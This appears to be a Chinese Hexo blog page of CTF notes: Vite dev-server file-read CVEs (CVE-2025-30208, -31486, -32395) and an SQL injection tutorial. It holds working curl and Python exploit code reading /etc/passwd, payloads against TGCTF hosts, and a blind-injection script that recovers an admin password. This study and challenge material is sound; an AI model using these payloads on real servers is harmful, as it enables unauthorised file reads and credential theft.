@@ -1,0 +1,966 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Zbaoabo</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Zbaoabo">
+<meta property="og:url" content="http://example.com/page/3/index.html">
+<meta property="og:site_name" content="Zbaoabo">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="zhangsuhong">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternative" href="/atom.xml" title="Zbaoabo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+				<img lazy-src="" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+			<h1 class="header-author"><a href="/">zhangsuhong</a></h1>
+		</hgroup>
+
+		
+			<p class="header-subtitle"></p>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">Home</a></li>
+				        
+							<li><a href="/archives">Archives</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="half-header-menu">
+						<a class="hide">Home</a>
+						<a>Tags</a>
+						<a>Links</a>
+						<a>About</a>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+						</div>
+						<!-- music -->
+						
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/">github</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+				
+				<section class="switch-part switch-part4">
+				
+					<div id="js-aboutme">I&#39;m a developer.</div>
+				</section>
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">Home</a></li>
+		        
+					<li><a href="/archives">Archives</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap">
+  
+    <article id="post-ViteCVE" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2025/04/21/ViteCVE/" class="article-date">
+  	<time datetime="2025-04-21T12:08:17.882Z" itemprop="datePublished">2025-04-21</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Vite-CVE-2025-30208-安全漏洞"><a href="#Vite-CVE-2025-30208-安全漏洞" class="headerlink" title="Vite CVE-2025-30208 安全漏洞"></a>Vite CVE-2025-30208 安全漏洞</h1><p>[TOc]</p>
+<h2 id="一、漏洞概述"><a href="#一、漏洞概述" class="headerlink" title="一、漏洞概述"></a>一、漏洞概述</h2><p><strong>CVE-2025-30208</strong> 是 Vite（一个前端开发工具提供商）在特定版本中存在的安全漏洞。此漏洞<strong>允许攻击者通过特殊的 URL 参数</strong>绕过对文件系统的访问限制，从而获取任意文件内容（包括非 Vite 服务目录范围外的文件）。</p>
+<h3 id="1-漏洞原理"><a href="#1-漏洞原理" class="headerlink" title="1.漏洞原理"></a>1.漏洞原理</h3><ul>
+<li>Vite 在开发服务器模式下提供了 @fs 用于访问服务允许范围内的文件。</li>
+<li>本应对超出范围的文件请求返回 403 Restricted；然而，在请求 URL 中添加 ?raw?? 或 ?import&amp;raw?? 时，可以绕过原有检查。</li>
+<li>这是由于在多个处理环节中会移除类似 ? 的结尾分隔符，但并未在查询字符串的正则匹配中考虑这一点；攻击者可利用这一缺陷读取目标文件内容。</li>
+</ul>
+<h3 id="2-漏洞影响"><a href="#2-漏洞影响" class="headerlink" title="2.漏洞影响"></a>2.漏洞影响</h3><ul>
+<li>在特定配置下，攻击者能够访问服务器上任意位置的文件（如 &#x2F;tmp&#x2F;secret.txt），并将内容返回给浏览器。</li>
+<li>仅在 <strong>显式暴露 Vite 开发服务器</strong>（如使用 –host 或在 server.host 中配置对外可访问）时，外部才可直接发起请求进行文件读取。</li>
+<li>如果文件中包含敏感数据（如凭据、配置等），则可能造成信息泄露。</li>
+</ul>
+<h3 id="3-不受影响场景"><a href="#3-不受影响场景" class="headerlink" title="3.不受影响场景"></a>3.不受影响场景</h3><ul>
+<li>在本地开发环境使用 Vite，不对外暴露端口；仅自己访问 localhost。</li>
+<li>已经将代码打包后交由 Nginx&#x2F;Tomcat&#x2F;Egg 等服务器代理，生产环境<strong>并无</strong>开启 Vite Dev Server。</li>
+<li>使用修复后的 Vite 版本</li>
+</ul>
+<h2 id="二、漏洞成因"><a href="#二、漏洞成因" class="headerlink" title="二、漏洞成因"></a>二、漏洞成因</h2><ul>
+<li><strong>核心问题</strong>：当请求 URL 带有 ?raw?? &#x2F; ?import&amp;raw?? 等结尾分隔符时，Vite 中移除 ? 等尾部分隔符的逻辑与查询字符串正则不匹配的处理不一致，导致访问超出允许列表的文件时的“403”限制被绕过。</li>
+</ul>
+<h2 id="三、漏洞利用实例"><a href="#三、漏洞利用实例" class="headerlink" title="三、漏洞利用实例"></a>三、漏洞利用实例</h2><ol>
+<li><p>正常情况下，访问 <a target="_blank" rel="noopener" href="http://localhost:5173/@fs/tmp/secret.txt">http://localhost:5173/@fs/tmp/secret.txt</a> 会返回：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">403 Restricted</span><br><span class="line">The request url &quot;/tmp/secret.txt&quot; is outside of Vite serving allow list.</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>2.但在请求后面加上 ?import&amp;raw??：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &quot;http://localhost:5173/@fs/tmp/secret.txt?import&amp;raw??&quot;</span><br></pre></td></tr></table></figure>
+
+<p>返回结果将是该文件的内容，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export default &quot;top secret content\n&quot;</span><br><span class="line">//# sourceMappingURL=data:application/json;..</span><br></pre></td></tr></table></figure>
+
+<h3 id="TGCTF-前端GAME"><a href="#TGCTF-前端GAME" class="headerlink" title="TGCTF 前端GAME"></a>TGCTF 前端GAME</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/@fs/etc/passwd?import&amp;raw??</span><br><span class="line"> /@fs/etc/passwd?raw??</span><br><span class="line"> /@fs/tgflagggg?import&amp;raw??</span><br><span class="line"> /@fs/tgflagggg?raw??</span><br></pre></td></tr></table></figure>
+
+<h1 id="CVE-2025-31486）-PLUS"><a href="#CVE-2025-31486）-PLUS" class="headerlink" title="(CVE-2025-31486）(PLUS)"></a>(CVE-2025-31486）(PLUS)</h1><p>该漏洞利用条件较为简单，攻击者可通过特定构造的请求触发安全风险</p>
+<h3 id="POC-1："><a href="#POC-1：" class="headerlink" title="POC 1："></a><strong>POC 1：</strong></h3><ol>
+<li>仅影响Vite 6.0及以上版本（即&gt;&#x3D;6.0.0的受影响版本）；</li>
+<li>仅当被读取的文件大小小于<code>build.assetsInlineLimit</code>配置值时（默认值为4KB）。</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &quot;http://localhost:5173/etc/passwd?.svg?.wasm?init&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="POC-2："><a href="#POC-2：" class="headerlink" title="POC 2："></a><strong>POC 2：</strong></h3><ul>
+<li>需要知道Vite所在的绝对路径</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 这里的/x/x/x/vite-project/是指Vite所在的绝对路径</span><br><span class="line">curl &quot;http://localhost:5173/@fs/x/x/x/vite-project/?/../../../../../etc/passwd?import&amp;?raw&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="TGCTF-前端GAME-plus"><a href="#TGCTF-前端GAME-plus" class="headerlink" title="TGCTF 前端GAME(plus)"></a>TGCTF 前端GAME(plus)</h3><p>flag在根目录下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd?.svg?.wasm?init</span><br><span class="line"> /tgflagggg?.svg?.wasm?init</span><br><span class="line"> #这个打法，不太好猜路径</span><br><span class="line">curl  &quot;http://node1.tgctf.woooo.tech:32613/@fs/app/?/../../../../../tgflagggg?import&amp;?raw</span><br></pre></td></tr></table></figure>
+
+<p>##（CVE-2025-32395）(ultra)</p>
+<p>复现前需要得到一个Vite所在的绝对路径，秀逗猫之前以为需要猜测，但其实还有技巧，先访问<code>/@fs/tmp/</code>，然后页面会返回如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">403 Restricted</span><br><span class="line">The request url &quot;/tmp&quot; is outside of Vite serving allow list.</span><br><span class="line"></span><br><span class="line">- /root/pseudocat</span><br><span class="line"></span><br><span class="line">Refer to docs https://vite.dev/config/server-options.html#server-fs-allow for configurations and more details.</span><br></pre></td></tr></table></figure>
+
+<p>这里的403页面会回显Vite的allow list，一般而言就是Vite所在的路径了。</p>
+<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 这里的/x/x/x/vite-project/是指Vite所在的绝对路径</span><br><span class="line">curl --request-target /@fs/x/x/x/vite-project/#/../../../../../etc/passwd http://localhost:5173/</span><br></pre></td></tr></table></figure>
+
+<p>HTTP 1.1规范（RFC 9112）规定在请求目标（request-target）中不允许出现<code>#</code>字符。然而，攻击者是有可能发送包含<code>#</code>的请求的。对于那些请求行（包含请求目标）无效的请求，规范建议服务器返回400错误请求）或301永久重定向）状态码来拒绝这些请求。对于HTTP 2协议也是类似的情况。</p>
+<p>如果是在Node或Bun运行Vite环境下，当收到包含<code>#</code>的请求时，这些运行时内部不会拒绝该请求，而是将其传递到用户代码层面。在这种情况下，<code>http.IncomingMessage.url</code>的值会包含<code>#</code>字符。而Vite在检查<code>server.fs.deny</code>时，假定<code>req.url</code>不会包含<code>#</code>字符，这就导致了包含<code>#</code>的这类请求能够绕过<code>server.fs.deny</code>的检查。</p>
+<p><code>curl --request-target</code>是一个用于手动指定HTTP请求目标的选项，主要用于精确控制请求行的格式，常见于调试、测试或特殊协议场景。</p>
+<p>当然也可以使用Python，注意使用<code>requests</code>没法复现。可以使用<code>http.client</code>，它是Python标准库中提供的一个底层的HTTP客户端模块，直接与网络套接字交互来发送和接收HTTP请求和响应，能够实现类似<code>curl --request-target</code>的功能。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import http.client</span><br><span class="line"></span><br><span class="line"># 替换为实际的 IP 地址</span><br><span class="line">ip = &#x27;xxx.xxx.xxx.xxx&#x27;</span><br><span class="line"># 替换为实际的 PORT 端口</span><br><span class="line">port = 5173</span><br><span class="line"># 定义请求目标路径</span><br><span class="line">request_target = &#x27;/@fs/root/pseudocat/#/../../../../../etc/passwd&#x27;</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    # 创建 HTTP 连接</span><br><span class="line">    conn = http.client.HTTPConnection(ip, port)</span><br><span class="line">    # 发起 GET 请求</span><br><span class="line">    conn.request(&#x27;GET&#x27;, request_target)</span><br><span class="line">    # 获取响应</span><br><span class="line">    response = conn.getresponse()</span><br><span class="line">    # 读取响应内容</span><br><span class="line">    data = response.read().decode(&#x27;utf-8&#x27;)</span><br><span class="line">    # 打印响应状态码和内容</span><br><span class="line">    print(f&quot;状态码: &#123;response.status&#125;&quot;)</span><br><span class="line">    print(data)</span><br><span class="line">except http.client.HTTPException as http_err:</span><br><span class="line">    print(f&quot;HTTP 异常: &#123;http_err&#125;&quot;)</span><br><span class="line">except Exception as e:</span><br><span class="line">    print(f&quot;发生其他错误: &#123;e&#125;&quot;)</span><br><span class="line">finally:</span><br><span class="line">    # 关闭连接</span><br><span class="line">    if conn:</span><br><span class="line">        conn.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>###TGCTF WEB-前端GAME Ultra</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">访问/@fs/tmp/获得绝对路径/app，同时给了附件看docker也能看出路径</span><br><span class="line">curl --request-target /@fs/app/#/../../../../../etc/passwd </span><br><span class="line">http://node1.tgctf.woooo.tech:32742/</span><br><span class="line"> curl --request-target /@fs/app/#/../../../../../tgflagggg </span><br><span class="line">http://node2.tgctf.woooo.tech:31500/</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/ViteCVE/image-20250421203653806.png" alt="image-20250421203653806"></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-SQL" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2025/04/19/SQL/" class="article-date">
+  	<time datetime="2025-04-19T07:16:43.980Z" itemprop="datePublished">2025-04-19</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h1><p>[TOC]</p>
+<h3 id="SQL注入产生原理详细分析"><a href="#SQL注入产生原理详细分析" class="headerlink" title="SQL注入产生原理详细分析"></a>SQL注入产生原理详细分析</h3><p>​          <strong>可控变量，带入数据库查询，变量未存在过滤或者过滤不严谨</strong> </p>
+<p><strong>基本查询语句</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;select *from users where id=1;</span><br><span class="line"> #select+列名（*代表所有）from+表名 where+条件语句</span><br><span class="line">&gt;select * from users where id in (1);</span><br><span class="line">#从users表格，查询所有包含id=3</span><br><span class="line">&gt;select * from users where id=(select id from users where username=&#x27;admin&#x27;);</span><br><span class="line">#子查询 优先执行（）内查询语句</span><br></pre></td></tr></table></figure>
+
+<p><strong>查询参数语句</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;select id from users union select email_id from emails;</span><br><span class="line">#查询并合并数据显示</span><br><span class="line">&gt;select * from users where id=6 union select * from emails where id=6;</span><br><span class="line">ERROR:have a different number of columns 联合注入前后表格列数必须相等</span><br><span class="line">&gt;select * from users where id=6 select *,3 from emails where id=6;</span><br><span class="line">#3为填充列</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>group by(分组)</strong></p>
+<h3 id="SQL注入的核心语句"><a href="#SQL注入的核心语句" class="headerlink" title="SQL注入的核心语句"></a>SQL注入的核心语句</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">information_schema</span><br><span class="line"></span><br><span class="line">schemata(schema_name)</span><br><span class="line"></span><br><span class="line">tables(table_schema,table_name)</span><br><span class="line"></span><br><span class="line">columns(table_schema,table_name,column_name)</span><br><span class="line"></span><br><span class="line">select schema_name from information_schema.schemata;</span><br><span class="line"></span><br><span class="line">select table_name from information_schema.tables where table_schema=&#x27;dvwa&#x27;;</span><br><span class="line"></span><br><span class="line">select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;dvwa&#x27;;</span><br><span class="line"></span><br><span class="line">select concat(username,password) from dvwa.users;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Xxy605/article/details/109750292">CTFHub_技能树_Web之SQL注入——布尔盲注详细原理讲解_保姆级手把手讲解自动化布尔盲注脚本编写_ctfhub布尔盲注-CSDN博客</a></p>
+<pre><code>当存在SQL注入时，攻击者无法通过页面或请求的返回信息，回显或获取到SQL注入语句的执行结果，这种情况就叫盲注。
+布尔型盲注就是利用返回的True或False来判断注入语句是否执行成功。它只会根据你的注入信息返回Ture跟Fales，也就没有了之前的报错信息。
+</code></pre>
+<p><strong>什么情况下考虑使用布尔盲注？</strong></p>
+<ol>
+<li><p>该输入框存在注入点。</p>
+</li>
+<li><p>该页面或请求不会回显注入语句执行结果，故无法使用UNION注入。</p>
+</li>
+<li><p>对数据库报错进行了处理，无论用户怎么输入都不会显示报错信息，故无法使用报错注入。</p>
+</li>
+</ol>
+<h4 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">length（str）函数 返回字符串的长度</span><br><span class="line">substr（str,poc,len）截取字符串,poc表示截取字符串的开始位，len表示截取字符串的长度</span><br><span class="line">ascii（）返回字符的ascii码，返回该字符对应的ascii码</span><br><span class="line">count（）：返回当前列的数量</span><br><span class="line">case when (条件) then 代码1 else 代码2 end :条件成立，则执行代码1，否则执行代码2</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="函数替换"><a href="#函数替换" class="headerlink" title="函数替换"></a>函数替换</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1、如果程序过滤了substr函数，可以用其他函数代替：效果与substr（）一样</span><br><span class="line">	left（str，index）从左边第index开始截取</span><br><span class="line">	right(str，index)从右边第index开始截取</span><br><span class="line">	substring（str，index）从左边index开始截取</span><br><span class="line">	mid（str，index，len）截取str从index开始，截取len的长度</span><br><span class="line">	lpad（str，len，padstr）</span><br><span class="line">	rpad（str，len，padstr）在str的左（右）两边填充给定的padstr到指定的长度len，返回填充的结果</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2、如果程序过滤了 = （等于号），可以用in()、like代替，效果一样：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3、如果程序过滤了ascii（），可以用hex()、bin（）、ord()代替，效果一样：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="布尔盲注的一般流程"><a href="#布尔盲注的一般流程" class="headerlink" title="布尔盲注的一般流程"></a>布尔盲注的一般流程</h3><p>因为盲注不能直接用database（）函数得到数据库名，所以步骤如下：<br>①判断数据库名的长度：<strong>and length(database())&gt;11</strong> 回显正常；**and length(database())&gt;12 **回显错误，说明数据库名是等于12个字符。<br>②猜测数据库名（使用ascii码来依次判断）：**and (ascii(substr(database(),1,1)))&gt;100 –+ **通过不断测试，确定ascii值，查看asciii表可以得出该字符，通过改变database（）后面第一个数字，可以往后继续猜测第二个、第三个字母…<br>③猜测表名：**and (ascii(substr((select table_name from information_schema.tables where table.schema&#x3D;database() limit 1,1)1,1)&gt;144 –+ **往后继续猜测第二个、第三个字母…<br>④猜测字段名（列名）：**and (ascii(substr((select column_name from information_schema.columns where table.schema&#x3D;database() and table_name&#x3D;’数据库表名’ limit 0,1)1,1)&gt;105 –+ **经过猜测 ascii为 105 为i 也就是表的第一个列名 id的第一个字母;同样,通过修改 limit 0,1 获取第二个列名 修改后面1,1的获取当前列的其他字段.<br>⑤猜测字段内容：因为知道了列名，所以直接 select password from users 就可以获取password里面的内容，username也一样 <strong>and (ascii(substr(( select password from users limit 0,1),1,1)))&#x3D;68–+</strong></p>
+<h4 id="eg"><a href="#eg" class="headerlink" title="eg"></a>eg</h4><p><strong>遇见这样的界面 可以先扫目录</strong> </p>
+<p><img src="/SQL/image-20250419155825900.png" alt="image-20250419155825900"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">url=&quot;http://43.249.195.138:22649/&quot;</span><br><span class="line">result=&quot;&quot;</span><br><span class="line">op = &quot;&quot;</span><br><span class="line">for i in range(1,50000):  </span><br><span class="line">    l=int(0)</span><br><span class="line">    r=int(128)</span><br><span class="line">    while l&lt;r:</span><br><span class="line">        j=(l+r)&gt;&gt;1</span><br><span class="line">        payload0=&#123;</span><br><span class="line">            &quot;username&quot;: f&quot;admin&#x27; and ascii(substr((select password from users),&#123;i&#125;,1))&gt; &#123;j&#125;#&quot;,</span><br><span class="line">            &quot;password&quot;:&quot;1&quot;,</span><br><span class="line">            &quot;submit&quot;:&quot;%E7%99%BB%E5%BD%95&quot;</span><br><span class="line">        &#125;</span><br><span class="line">        result =requests.post(url=url,data=payload0)</span><br><span class="line">        if (&#x27;用户名或密码错误&#x27; in result.text):</span><br><span class="line">            r=j</span><br><span class="line">        else:</span><br><span class="line">            l=j+1</span><br><span class="line">    op+=chr(l)</span><br><span class="line">    print(op)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; and length(database()) &gt; 1#爆破当前数据库长度</span><br></pre></td></tr></table></figure>
+
+<p>爆到6报错，说明当前数据库长度为6</p>
+<p>继续爆库名</p>
+<p>从第一位开始，从a字母开始</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; and substr(database(),1,1) &gt; &#x27;b&#x27; #第一位为b</span><br><span class="line"></span><br><span class="line">admin&#x27; and substr(database(),2,1) &gt; &#x27;t&#x27; #第二位为t</span><br></pre></td></tr></table></figure>
+
+<p>后面爆出当前库名字就是出题人名字：<strong>bthcls</strong></p>
+<p>附件拿到两个字典，应该是表和列的，使用bp来爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; and substr((select §xx§ from bthcls.§xx§ limit 0,1),1,1)&gt;&#x27;a&#x27; #</span><br></pre></td></tr></table></figure>
+
+<p>得到<strong>bthcls.users.password****有值</strong></p>
+<p>爆数据，字典为32-127纯数字（可打印字符的ascii十进制值）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;and ascii(substr((select group_concat(password)from bthcls.users limit 0,1),1,1))&gt;§32§ #</span><br></pre></td></tr></table></figure>
+
+<p>得到第一位的asciii码十进制为119</p>
+<p>后续相同操作一直爆，最后爆出完整密码：119 101 49 99 111 109 101 55 111 49 115 99 116 102</p>
+<p>对应字符：<strong>we1come7o1sctf</strong></p>
+<p>**账号：**admin</p>
+<p>**密码：**we1come7o1sctf</p>
+<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">界面返回值只有一种,true 无论输入任何值 返回情况都会按正常的来处理。加入特定的时间函数，通过查看web页面返回的时间差来判断注入的语句是否正确。 </span><br><span class="line">时间盲注与布尔盲注类似。时间型盲注就是利用时间函数的延迟特性来判断注入语句是否执行成功。</span><br><span class="line"></span><br><span class="line">**什么情况下考虑使用时间盲注？**</span><br><span class="line">1. 无法确定参数的传入类型。整型，加单引号，加双引号返回结果都一样</span><br><span class="line">2. 不会回显注入语句执行结果，故无法使用UNION注入</span><br><span class="line">3. 不会显示报错信息，故无法使用报错注入</span><br><span class="line">4. 符合盲注的特征，但不属于布尔型盲注</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="常用函数-1"><a href="#常用函数-1" class="headerlink" title="常用函数"></a>常用函数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sleep(n)：将程序挂起一段时间 n为n秒。</span><br><span class="line">if(expr1,expr2,expr3):判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句。</span><br><span class="line"></span><br><span class="line">使用sleep()函数和if()函数：`and (if(ascii(substr(database(),1,1))&gt;100,sleep(10),null))  --+`   如果返回正确则 页面会停顿10秒，返回错误则会立马返回。只有指定条件的记录存在时才会停止指定的秒数。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="时间盲注的一般流程"><a href="#时间盲注的一般流程" class="headerlink" title="时间盲注的一般流程"></a>时间盲注的一般流程</h4><p>①猜测数据库名称长度：<br>输入：<strong>id&#x3D;1’ and If(length(database()) &gt; 1,1,sleep(5))–+</strong><br>用时：&lt;1s，数据库名称长度&gt;1<br>…<br>输入：<strong>id&#x3D;1’ and If(length(database()) &gt;8 ,1,sleep(5))–+</strong><br>用时：5s，数据库名称长度&#x3D;8<br>得出结论：数据库名称长度等于8个字符。<br>②猜测数据库名称的一个字符：<br>输入：<strong>id&#x3D;1’ and If(ascii(substr(database(),1,1))&#x3D;97,sleep(5),1)–+</strong><br>用时：&lt;1s<br>…<br>输入：<strong>id&#x3D;1’ and If(ascii(substr(database(),1,1))&#x3D;115,sleep(5),1)–+</strong><br>用时：5s</p>
